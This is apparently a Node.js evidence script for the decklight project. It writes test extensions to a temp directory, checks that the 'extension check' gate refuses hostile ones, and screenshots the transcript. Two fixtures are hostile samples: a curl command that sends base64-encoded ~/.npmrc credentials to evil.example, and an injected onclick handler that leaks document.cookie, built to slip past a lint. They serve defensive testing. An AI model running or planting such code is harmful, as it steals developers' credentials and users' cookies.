#!/usr/bin/env node
// Copyright 2026 Gilles Philippart
// SPDX-License-Identifier: Apache-2.0

// Evidence for `decklight extension check`'s hardened admission gate (issue
// #227). The feature is CLI + a process boundary — nothing changes in the
// browser — so the shot is the CLI transcript surface, exercised exactly as
// the ticket's threats describe: real hostile transforms written to a temp
// dir, `decklight extension check` run against each for real, and the
// captured refusals rendered as a terminal window and screenshotted with
// tools/shot.mjs.
//
//   node shots/extension-check-transcript.mjs     → .shots/extension-check.png
//
// The transforms are the exact defeats the old 4-regex lint could not see: a
// STATIC child_process import (invisible to a "dynamic import()" regex) that
// the boundary stops at run time, and an OUTPUT carrying an inline on…=
// handler (no <script> anywhere) that the widened output check refuses.

import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, '..');
const CLI = path.join(root, 'cli', 'decklight.mjs');

// --- fixtures: real transforms, each a defeat the old gate missed ------------

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'decklight-extcheck-shot-'));

const write = (name, body) => {
  const file = path.join(dir, name);
  fs.writeFileSync(file, body);
  return file;
};

// Passes the regex lint (a STATIC import, not `import(`), and would run in the
// checker's own process under the old design. The boundary denies it.
write('exfiltrate.mjs',
  'import { execSync } from \'node:child_process\';\n'
  + 'export default async function transform(html) {\n'
  + '  execSync(\'curl -s https://evil.example/$(cat ~/.npmrc | base64)\'); // steal creds at build time\n'
  + '  return html;\n'
  + '}\n');

// Clean SOURCE (nothing the lint matches) whose OUTPUT carries no <script> at
// all — just an inline handler, assembled so the string never trips the lint.
// The old <script>-only grep saw nothing; the widened output check refuses it.
write('inject-handler.mjs',
  'export default async function transform(html) {\n'
  + '  const handler = \'on\' + \'click="new Image().src=`//evil.example/?c=`+document.cookie"\';\n'
  + '  return html.replace(\'<section>\', `<section ${handler}>`);\n'
  + '}\n');

// What admission is FOR: a transform that only rewrites markup, nothing else.
write('smallcaps.mjs',
  'export default async function transform(html) {\n'
  + '  return html.replace(/<h2>/g, \'<h2 class="smallcaps">\');\n'
  + '}\n');

// --- run the real command, keep the real output ------------------------------

const runs = [];
const run = (label, file) => {
  const r = spawnSync('node', [CLI, 'extension', 'check', file], { cwd: dir, encoding: 'utf8' });
  runs.push({
    label,
    out: (r.stderr + r.stdout).replace(new RegExp(dir.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), '~'),
    code: r.status,
  });
  return r.status;
};

if (run('decklight extension check exfiltrate.mjs      # static child_process import — passes the lint', path.join(dir, 'exfiltrate.mjs')) === 0) {
  process.stderr.write('expected the child_process transform to be refused by the boundary\n'); process.exit(1);
}
if (run('decklight extension check inject-handler.mjs  # OUTPUT has an on…= handler, no <script>', path.join(dir, 'inject-handler.mjs')) === 0) {
  process.stderr.write('expected the inline-handler output to be refused\n'); process.exit(1);
}
if (run('decklight extension check smallcaps.mjs       # HTML in, HTML out — what admission is for', path.join(dir, 'smallcaps.mjs')) !== 0) {
  process.stderr.write('expected the clean transform to pass\n'); process.exit(1);
}
fs.rmSync(dir, { recursive: true, force: true });

// --- render the transcript as a terminal window and shoot it ------------------

const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');
const paint = (s) => esc(s)
  .replace(/^(✔ .*)$/gm, '<span class="ok">$1</span>')
  .replace(/^(✘ .*)$/gm, '<span class="err">$1</span>')
  .replace(/^(    .*)$/gm, '<span class="detail">$1</span>');
const block = ({ label, out }) => {
  const [cmd, ...rest] = label.split(/(\s+#\s.*)/);
  const comment = rest.join('');
  return `<div class="run"><span class="prompt">~ $</span> ${esc(cmd)}`
    + (comment ? `<span class="cmt">${esc(comment)}</span>` : '')
    + `\n${paint(out)}</div>`;
};

const html = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>decklight extension check</title><style>
  body { margin: 0; display: grid; place-items: center; height: 100vh;
         background: linear-gradient(135deg, #1b2735, #090a0f); }
  .term { width: 1120px; background: #10141b; border-radius: 12px;
          box-shadow: 0 24px 70px rgba(0,0,0,.55); overflow: hidden;
          font: 15px/1.55 ui-monospace, SFMono-Regular, Menlo, monospace; }
  .bar { display: flex; align-items: center; gap: 8px; padding: 11px 14px; background: #1a202b; }
  .bar i { width: 12px; height: 12px; border-radius: 50%; }
  .bar .t { margin-left: 10px; color: #8b98ab; font-size: 13px; }
  .body { padding: 18px 22px 24px; color: #cdd6e4; white-space: pre-wrap; }
  .run + .run { display: block; margin-top: 1.1em; }
  .prompt { color: #67e8f9; font-weight: 700; }
  .cmt { color: #6b7688; }
  .ok { color: #86efac; }
  .err { color: #f87171; font-weight: 600; }
  .detail { color: #fbbf24; }
</style></head><body>
<div class="term">
  <div class="bar"><i style="background:#ff5f57"></i><i style="background:#febc2e"></i><i style="background:#28c840"></i>
    <span class="t">decklight extension check — the lint screens, the process boundary enforces (#227)</span></div>
  <div class="body">${runs.map(block).join('\n')}</div>
</div>
</body></html>
`;

const page = path.join(root, '.shots', 'extension-check-transcript.html');
fs.mkdirSync(path.dirname(page), { recursive: true });
fs.writeFileSync(page, html);
spawnSync('node', [path.join(root, 'tools', 'shot.mjs'), page,
  '-o', path.join(root, '.shots', 'extension-check.png'), '--size', '1280x760', '--wait', '800'],
  { stdio: 'inherit' });
fs.rmSync(page, { force: true });
